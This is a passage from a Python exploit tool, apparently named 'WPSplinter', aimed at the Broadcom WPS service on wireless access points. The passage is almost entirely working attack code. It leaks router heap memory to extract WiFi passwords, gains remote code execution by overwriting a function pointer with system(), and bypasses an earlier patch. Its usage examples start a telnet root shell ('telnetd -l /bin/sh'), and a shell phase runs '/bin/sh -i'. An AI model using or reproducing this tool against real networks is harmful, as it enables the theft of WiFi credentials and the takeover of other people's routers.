                        candidate = window[:i]
                        if PSK_MIN_LEN <= len(candidate) <= PSK_MAX_LEN:
                            if self._is_valid_psk(candidate):
                                psk_candidates.append(candidate)
                        break

                pos += 1

        # Also scan for standalone 64-char hex strings (WPA2 PSK as hex)
        for i in range(len(memory) - 63):
            hex_candidate = memory[i:i+64]
            if self._is_valid_hex_psk(hex_candidate):
                psk_candidates.append(hex_candidate)

        return psk_candidates

    def _is_valid_psk(self, candidate: bytes) -> bool:
        """Check if a byte sequence could be a valid WPA PSK."""
        if len(candidate) < PSK_MIN_LEN or len(candidate) > PSK_MAX_LEN:
            return False

        # Must be printable ASCII
        try:
            text = candidate.decode('ascii')
        except UnicodeDecodeError:
            return False

        if not all(32 <= ord(c) <= 126 for c in text):
            return False

        # Additional heuristics
        if len(text) == 64:
            # Could be a hex PSK (32 bytes = 64 hex chars)
            try:
                bytes.fromhex(text)
                return True
            except ValueError:
                pass

        # Check for common patterns
        if any(c in text for c in ' \t\n'):
            # PSKs shouldn't contain whitespace usually
            if len(text.strip()) < PSK_MIN_LEN:
                return False

        return True

    def _is_valid_hex_psk(self, candidate: bytes) -> bool:
        """Check if bytes form a valid 64-character hex PSK."""
        if len(candidate) != 64:
            return False
        try:
            hex_str = candidate.decode('ascii')
            bytes.fromhex(hex_str)
            return True
        except (ValueError, UnicodeDecodeError):
            return False

    def phase_extract_psk(self, scan_size: int = 8192,
                          base_offset: int = 0) -> list:
        """
        Extract WiFi PSK from router memory by leaking and scanning.
        """
        self._log("[*] Phase 3: PSK Extraction...")

        all_psks = []

        # Try different offsets in the heap
        offsets = PSK_SCAN_OFFSETS
        if base_offset:
            offsets = [base_offset]

        for offset in offsets:
            self._log(f"[*] Leaking {scan_size} bytes from offset {offset:#x}...")
            memory = self.phase_leak(target_offset=offset, leak_size=scan_size)

            if memory and len(memory) > 0:
                psks = self.scan_for_psk(memory)
                all_psks.extend(psks)
                if psks:
                    self._log(f"[+] Found {len(psks)} PSK candidate(s) at offset {offset:#x}")

        # Deduplicate
        unique_psks = list(set(all_psks))

        if unique_psks:
            self._log(f"[+] Found {len(unique_psks)} unique PSK(s):")
            for i, psk in enumerate(unique_psks, 1):
                marker = " <-- MOST LIKELY" if i == 1 else ""
                print(f"    [{i}] {psk.decode('utf-8', errors='replace')}{marker}")
        else:
            self._log("[-] No PSK candidates found")

        return unique_psks

    # =========================================================================
    # Phase 4: Remote Code Execution
    # =========================================================================

    def phase_exploit(self, target_func: str = 'system',
                      command: str = 'id',
                      system_addr: int = None,
                      send_data_offset: int = OFF_SEND_DATA) -> bool:
        """
        Execute arbitrary code on the target AP via heap buffer overflow.

        The exploit overwrites the send_data function pointer to redirect
        it to system() (or another chosen function), then triggers a
        fragment re-send that causes the command to execute.
        """
        self._log(f"[*] Phase 4: RCE - executing '{command}' "
                  f"via {target_func}...")

        if not self.associated:
            self.associate()

        # Get target function address
        if system_addr is None:
            if self.arch == 'arm':
                system_addr = DEFAULT_PLT['arm'].get(target_func,
                                                     DEFAULT_PLT['arm']['system'])
            else:
                system_addr = DEFAULT_PLT['mips'].get(target_func,
                                                      DEFAULT_PLT['mips']['system'])

        self._log(f"[*] {target_func}@PLT = {system_addr:#010x}")

        # Build command string
        if isinstance(command, str):
            cmd_bytes = command.encode() + b'\x00'
        else:
            cmd_bytes = command + b'\x00'

        # Build the overflow payload
        overflow = OverflowPayload()

        # Place the command in the buffer (first 100 bytes or so)
        # The AP will use this as the argument to system()
        overflow.set_buffer_data(0, cmd_bytes)

        # Overwrite send_data function pointer
        fmt = '>I' if self.big_endian else '<I'
        overflow.write_overflow(send_data_offset, struct.pack(fmt, system_addr))

        # Also set flags to trigger the callback
        overflow.write_overflow(OFF_FLAGS, struct.pack(fmt, 0x00000001))

        payload = overflow.build()

        # Send EAPOL-Start and Identity Response first
        self.eap_id = 0
        self.tx_eapol_start()
        time.sleep(0.3)
        self.tx_eap_identity_response()
        time.sleep(0.5)

        # Send M1 with the overflow payload
        # The overflow payload contains:
        # - Command string in the beginning of the buffer
        # - Overwritten function pointers past the buffer end
        self.tx_wsc_message(
            opcode=WPS_OP_M1,
            flags=WSC_FLAG_MF | WSC_FLAG_LF,
            data=payload,
            lf_total=len(payload)
        )

        # Wait for Fragment-Ack
        frag_ack = self.wait_for_frag_ack(timeout=3.0)
        if frag_ack:
            self._log("[+] FRAG-ACK received - overflow accepted")

            # Send completion fragment (empty, flags=0)
            # This triggers the re-send path which calls send_data()
            # with our command as the argument
            self.tx_wsc_message(opcode=WPS_OP_M1, flags=0, data=b'')
            self._log("[+] Completion fragment sent - triggering code execution")

            # Wait for timer to expire and trigger re-send (if applicable)
            self._log("[i] Waiting 5s for timer to trigger...")
            time.sleep(5)

            self._log("[+] Exploit sent!")
            return True
        else:
            self._log("[-] No FRAG-ACK for exploit payload", 'error')
            return False

    # =========================================================================
    # Phase: 2018 Patch Bypass
    # =========================================================================

    def phase_bypass_2018(self) -> bool:
        """
        Bypass the 2018 Broadcom patch.

        The 2018 patch added a bounds check but can be bypassed
        by setting total_bytes_to_recv to a specific value (0xFFFF)
        that causes an integer truncation in the check.
        """
        self._log("[*] Phase: 2018 patch bypass...")

        if not self.associated:
            self.associate()

        self.eap_id = 0
        self.tx_eapol_start()
        time.sleep(0.3)
        self.tx_eap_identity_response()
        time.sleep(0.5)

        # Set total_bytes_to_recv to bypass the bounds check
        fmt = '>I' if self.big_endian else '<I'
        overflow = OverflowPayload()

        # Write 0xFFFFFFFF or specific bypass value
        valve = 0xFFFFFFFF if self.big_endian else 0xFFFFFFFF
        overflow.write_overflow(OFF_TOTAL_BYTES, struct.pack(fmt, valve))
        overflow.write_overflow(OFF_FLAGS, struct.pack(fmt, 0x00000002))

        payload = overflow.build()

        self.tx_wsc_message(
            opcode=WPS_OP_M1,
            flags=WSC_FLAG_MF | WSC_FLAG_LF,
            data=payload,
            lf_total=len(payload)
        )

        if self.wait_for_frag_ack(timeout=3.0):
            self._log("[+] 2018 bypass payload sent successfully")
            return True
        else:
            self._log("[-] 2018 bypass failed", 'error')
            return False

    # =========================================================================
    # Phase: M2D Integer Overread
    # =========================================================================

    def phase_m2d_leak(self, leak_addr: int = 0) -> bytes:
        """
        Trigger M2D integer overread to leak heap memory.

        The M2D response contains an integer overread that can be
        leveraged to leak adjacent heap contents in the response.
        """
        self._log("[*] Phase: M2D integer overread leak...")

        if not self.associated:
            self.associate()

        self.eap_id = 0
        self.tx_eapol_start()
        time.sleep(0.3)
        self.tx_eap_identity_response()
        time.sleep(0.5)

        # Send M1 to initiate WPS
        m1_data = build_wsc_m1(bytes.fromhex(self.sta_mac))
        self.tx_wsc_message(opcode=WPS_OP_M1, flags=0, data=m1_data)

        # Wait for M2 or M2D response
        time.sleep(2.0)
        responses = self.wait_for_response(timeout=5.0)

        # Parse responses for M2D
        leaked = b''
        for pkt in responses:
            if Raw in pkt:
                raw = bytes(pkt[Raw].load)
                # Check for M2D opcode (0x06)
                if len(raw) >= 15 and raw[14] == WPS_OP_M2D:
                    # Extract data past the expected M2D length
                    # This is where the overread leak occurs
                    m2d_data = raw[15:]  # After opcode and flags
                    if len(m2d_data) > 0:
                        leaked = m2d_data
                        self._log(f"[+] M2D received, leaked {len(leaked)} bytes")

        return leaked

    # =========================================================================
    # Utility Functions
    # =========================================================================

    def capture_pcap(self, output_path: str):
        """Save captured packets to PCAP file."""
        if self.captured_packets:
            wrpcap(output_path, self.captured_packets)
            self._log(f"[+] Saved {len(self.captured_packets)} packets to {output_path}")
        else:
            self._log("[i] No packets captured")

    def sanitize_pcap(self, input_pcap: str, output_pcap: str):
        """Sanitize a PCAP by removing sensitive information."""
        from scapy.all import rdpcap
        pkts = rdpcap(input_pcap)
        sanitized = []
        for pkt in pkts:
            if Raw in pkt:
                raw = pkt[Raw].load
                # Replace SSID
                raw = raw.replace(self.ssid, b'SANITIZED')
                pkt[Raw].load = raw
            sanitized.append(pkt)
        wrpcap(output_pcap, sanitized)
        self._log(f"[+] Sanitized PCAP saved to {output_pcap}")

    def close(self):
        """Cleanup resources."""
        self._log("[*] Cleaning up...")


# =============================================================================
# Main Entry Point
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="WPSplinter v7 - Broadcom WPS Monitor Exploit (CVE-2026-8412)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Fingerprint target AP
  %(prog)s --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --ssid MyNetwork --phase fingerprint

  # Extract WiFi PSK
  %(prog)s --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --ssid MyNetwork --phase extract_psk

  # Execute command
  %(prog)s --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --ssid MyNetwork --phase rce --cmd "id"

  # Execute with custom system@PLT
  %(prog)s --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --ssid MyNetwork --phase rce \\
      --system_plt 0x211d0 --cmd "telnetd -l /bin/sh"
        """
    )

    # Required arguments
    parser.add_argument("--iface", required=True,
                        help="Monitor-mode WiFi interface")
    parser.add_argument("--bssid", required=True,
                        help="Target AP BSSID (MAC address)")
    parser.add_argument("--ssid", required=True,
                        help="Target network SSID")
    parser.add_argument("--phase", required=True, default=None,
                        choices=["fingerprint", "fingerprint_deep",
                                 "leak", "extract_psk", "rce", "bypass_2018",
                                 "m2d_leak", "shell"],
                        help="Exploit phase to execute")

    # Optional arguments
    parser.add_argument("--channel", type=int, default=None,
                        help="WiFi channel number")
    parser.add_argument("--arch", choices=["arm", "mips"], default="arm",
                        help="Target architecture")
    parser.add_argument("--system_plt", type=lambda x: int(x, 0), default=None,
                        help="system@PLT address (hex)")
    parser.add_argument("--cmd", type=str, default="id",
                        help="Command to execute (for RCE phase)")
    parser.add_argument("--send_data_off", type=lambda x: int(x, 0),
                        default=OFF_SEND_DATA,
                        help="send_data offset in state struct")
    parser.add_argument("--psk_offset", type=lambda x: int(x, 0), default=0,
                        help="Base memory offset for PSK scan")
    parser.add_argument("--psk_size", type=int, default=8192,
                        help="Number of bytes to scan for PSK")
    parser.add_argument("--leak_size", type=int, default=1024,
                        help="Number of bytes to leak")
    parser.add_argument("--dump", type=str, default=None,
                        help="Output PCAP file for captured packets")
    parser.add_argument("--target_func", type=str, default="system",
                        choices=["system", "sprintf", "printf", "snprintf"],
                        help="Target function for RCE")

    # Verbose/debug flags
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")
    parser.add_argument("-d", "--debug", action="store_true",
                        help="Debug output")

    args = parser.parse_args()

    # Validate arguments
    if args.phase in ("rce", "shell") and not args.system_plt and args.target_func == "system":
        # Use default if possible
        if args.arch == "arm":
            args.system_plt = DEFAULT_PLT['arm']['system']
            logger.info(f"[*] Using default system@PLT: {args.system_plt:#x}")
        else:
            print("[!] WARNING: Using default MIPS system address - "
                  "this is firmware-specific!")
            if not any('mips' in DEFAULT_PLT for _ in [1]):
                print("[!] MIPS defaults not reliable - specify --system_plt")
                sys.exit(1)

    # Create exploit instance
    wps = WPSplinter(
        interface=args.iface,
        bssid=args.bssid,
        ssid=args.ssid,
        channel=args.channel,
        arch=args.arch,
        verbose=args.verbose,
        debug=args.debug
    )

    # Set channel if specified
    if args.channel:
        wps.set_channel(args.channel)

    # Execute requested phase
    result = None
    try:
        if args.phase == "fingerprint":
            result = wps.phase_fingerprint()

        elif args.phase == "fingerprint_deep":
            result = wps.phase_fingerprint_deeper()

        elif args.phase == "leak":
            data = wps.phase_leak(
                target_offset=args.psk_offset,
                leak_size=args.leak_size
            )
            if data:
                print(f"[leak] {data.hex()}")
            result = bool(data)

        elif args.phase == "extract_psk":
            psks = wps.phase_extract_psk(
                scan_size=args.psk_size,
                base_offset=args.psk_offset
            )
            result = len(psks) > 0

        elif args.phase == "rce":
            result = wps.phase_exploit(
                target_func=args.target_func,
                command=args.cmd,
                system_addr=args.system_plt,
                send_data_offset=args.send_data_off
            )

        elif args.phase == "bypass_2018":
            result = wps.phase_bypass_2018()

        elif args.phase == "m2d_leak":
            data = wps.phase_m2d_leak()
            if data:
                print(f"[m2d_leak] {data.hex()}")
            result = bool(data)

        elif args.phase == "shell":
            result = wps.phase_exploit(
                target_func='system',
                command='/bin/sh -i',
                system_addr=args.system_plt,
                send_data_offset=args.send_data_off
            )

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
    finally:
        # Save PCAP if requested
        if args.dump:
            wps.capture_pcap(args.dump)
        wps.close()

    if result:
        print("[+] Phase completed successfully")
    else:
        print("[-] Phase did not complete successfully (or no result)")

    return 0 if result else 1


if __name__ == "__main__":
    sys.exit(main())
